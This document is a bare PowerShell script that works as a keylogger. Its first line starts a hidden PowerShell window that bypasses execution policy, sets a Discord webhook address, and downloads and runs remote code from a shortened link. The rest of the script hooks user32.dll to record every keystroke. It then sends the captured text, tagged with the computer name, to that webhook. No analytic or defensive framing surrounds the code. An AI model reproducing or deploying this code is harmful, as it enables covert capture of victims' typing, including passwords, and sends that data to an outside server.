Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoP -Ep Bypass -C `$dc='https://discord.com/api/webhooks/1349127152582525018/MesbCMKY4JaQceGiH2gvJ-afwmxp6SiQc421d2xJqFHiOnIi7TWaWnfT7BTlUktDCa4J'; irm https://is.gd/lBI1od | iex"

# Add customizations
$sessionID = [guid]::NewGuid().ToString() # Generate a unique session ID
$computerName = $env:COMPUTERNAME
$send = ""
$KeypressCount = 0

# Import DLL Definitions for keyboard inputs
$API = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
$API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru

# Stopwatch for intelligent sending
$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
$KeypressThreshold = [TimeSpan]::FromSeconds(10)

# Continuous loop for keypress detection
While ($true) {
    $keyPressed = $false
    try {
        while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
            Start-Sleep -Milliseconds 30
            for ($asc = 8; $asc -le 254; $asc++) {
                $keyst = $API::GetAsyncKeyState($asc)
                if ($keyst -eq -32767) {
                    $keyPressed = $true
                    $LastKeypressTime.Restart()
                    $null = [console]::CapsLock
                    $vtkey = $API::MapVirtualKey($asc, 3)
                    $kbst = New-Object Byte[] 256
                    $checkkbst = $API::GetKeyboardState($kbst)
                    $logchar = New-Object -TypeName System.Text.StringBuilder

                    if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
                        $LString = $logchar.ToString()
                        if ($asc -eq 8) { $LString = "[BS]" }
                        if ($asc -eq 13) { $LString = "[ENT]" }
                        if ($asc -eq 27) { $LString = "[ESC]" }
                        if ($asc -eq 32) { $LString = "[SPC]" }

                        $send += $LString
                        $KeypressCount++
                    }
                }
            }
        }
    }
    finally {
        If ($keyPressed) {
            $timestamp = Get-Date -Format "HH:mm:ss"
            $formattedMessage = "[$timestamp] [$sessionID] **$computerName**: $send (Keys: $KeypressCount)"
            $jsonsys = @{
                "username" = "$computerName"
                "content"  = $formattedMessage
            } | ConvertTo-Json

            # Send the message to Discord (real-time updates)
            Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys

            # Clear the message buffer and reset counter
            $send = ""
            $KeypressCount = 0
        }
    }

    # Reset the stopwatch before restarting the loop
    $LastKeypressTime.Restart()
    Start-Sleep -Milliseconds 10
}
